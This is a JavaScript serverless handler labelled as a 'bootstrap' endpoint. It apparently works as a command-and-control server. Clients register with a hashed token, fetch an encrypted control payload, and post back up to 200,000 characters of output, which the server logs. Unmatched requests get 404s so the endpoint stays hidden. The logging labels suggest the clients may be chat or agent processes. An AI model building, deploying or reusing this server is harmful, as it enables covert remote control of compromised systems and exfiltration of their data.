import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '15';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+bYV/RWDsNbVmAfwjIR06yAGsVhKWbeIxqfzJkrwPz/iFF/Yj0mcwDvNrW2vlPXBdm/ZbYKq0hAO0aNYyeUHJij8sEUX7U1FBwqnN6mS9g2B0XwbZ/V1xDNCGPtTCRwKeXcUpogOKMOlKG/kSFt1GTfhC12uygnUMpFBHE6RvK+rmbsCZQHmsQ0XjtbCMpZUT9EbyKOMt4GpM4HcrrnnF7wBVT5enkTGHmnZ6haUyqDbu2eH59lxUDkhgZR8q5KmFp4ST8A8SnJ5IS2N/LcMbQfX7GP3UvYl/NjkUZlBn2sq9juhdbbtylEmTDvX0+PCSYqb56MKIQd/55V5uQgzQ16KO6gmanbeqO2PCc+JILYM4U2ccUqu5ZNfXSDf4Xp+s9jLrksgTNpcKILP97aEmGXzZJh/IJ4/whEtzzv7VKHZfKqZcpzAbii1XXU1L8rI4lGLrt9ueoF+KC9bt0VwvbT0bO7NNKC+S9sFMBJrwZlA7I8tVIhtDaN9JzKX3Om0i8BB1SdbF+lg+6LWr2ik71/35+Xq00nWywxFVpGfTXwMjF6x8XUI3JuWC3OZy/bkS++Xw1xPqtFSDUKH64Ex0KpB0o0eLNphotX4ZCpMIt5l95MjlNNw8rmjeJTH/Ap4bIpaTGQ52aU5ixFUHyoNROLdGodmWAbDA8TKMmVfDQnoZftsCfjxjCREVf9os1Q95anjtRqD1U5ysc3qGXJymx8bVmKzJlg3I=';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
